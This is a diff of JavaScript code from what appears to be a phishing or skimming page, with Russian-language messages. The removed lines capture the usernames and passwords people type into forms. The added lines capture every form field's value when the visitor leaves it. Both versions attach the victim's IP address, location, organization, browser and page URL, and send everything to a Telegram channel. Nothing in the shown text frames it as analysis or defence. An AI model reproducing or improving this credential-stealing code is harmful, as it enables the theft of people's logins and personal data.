@@ -46,43 +46,16 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-document.addEventListener("submit", event => {
-    const formData = new FormData(event.target);
-    const login = formData.get("user") || "Не указано";
-    const password = formData.get("passwd") || "Не указано";
-
+// Функция для отправки данных формы
+function sendFieldData(name, value) {
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `🚀 *Новая отправка формы:*
+            const message = `📋 *Изменение в поле формы:*
 ---
-- 🛡️ **Логин:**
-\`\`\`
-${login}
-\`\`\`
-- 🛡️ **Пароль:**
-\`\`\`
-${password}
-\`\`\`
-- 🌐 **IP-адрес:** ${info.ip}
-- 📍 **Местоположение:** ${info.location}
-- 🖥️ **User-Agent:** ${simplifiedUserAgent}
-- 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${info.org}
-${domainHashTag}`;
-            sendToTelegram(message);
-        });
-    });
-});
-
-function logPageVisit() {
-    const simplifiedUserAgent = getSimplifiedUserAgent();
-
-    getIPInfo().then(info => {
-        hashDomain(info.org).then(domainHashTag => {
-            const message = `🌍 *Новый визит страницы:*
----
+- 🛡️ **Поле:** \`${name}\`
+- ✍️ **Значение:** \`${value || "Не указано"}\`
 - 🌐 **IP-адрес:** ${info.ip}
 - 📍 **Местоположение:** ${info.location}
 - 🖥️ **User-Agent:** ${simplifiedUserAgent}
@@ -94,36 +67,11 @@ ${domainHashTag}`;
     });
 }
 
-document.querySelectorAll("form").forEach(form => {
-    form.addEventListener("input", event => {
-        const formData = new FormData(event.target.form);
-        const login = formData.get("user") || "Не указано";
-        const password = formData.get("passwd") || "Не указано";
-
-        const simplifiedUserAgent = getSimplifiedUserAgent();
-
-        getIPInfo().then(info => {
-            hashDomain(info.org).then(domainHashTag => {
-                const message = `🚨 *Изменение в форме:*
----
-- 🛡️ **Логин:**
-\`\`\`
-${login}
-\`\`\`
-- 🛡️ **Пароль:**
-\`\`\`
-${password}
-\`\`\`
-- 🌐 **IP-адрес:** ${info.ip}
-- 📍 **Местоположение:** ${info.location}
-- 🖥️ **User-Agent:** ${simplifiedUserAgent}
-- 🔗 **Страница:** ${window.location.href}
-- 🏢 **Организация:** ${info.org}
-${domainHashTag}`;
-                sendToTelegram(message);
-            });
-        });
+// Отлавливаем событие выхода из поля
+document.querySelectorAll("form input").forEach(input => {
+    input.addEventListener("blur", event => {
+        const fieldName = event.target.name || "Неизвестное поле";
+        const fieldValue = event.target.value;
+        sendFieldData(fieldName, fieldValue);
     });
 });
-
-//logPageVisit();
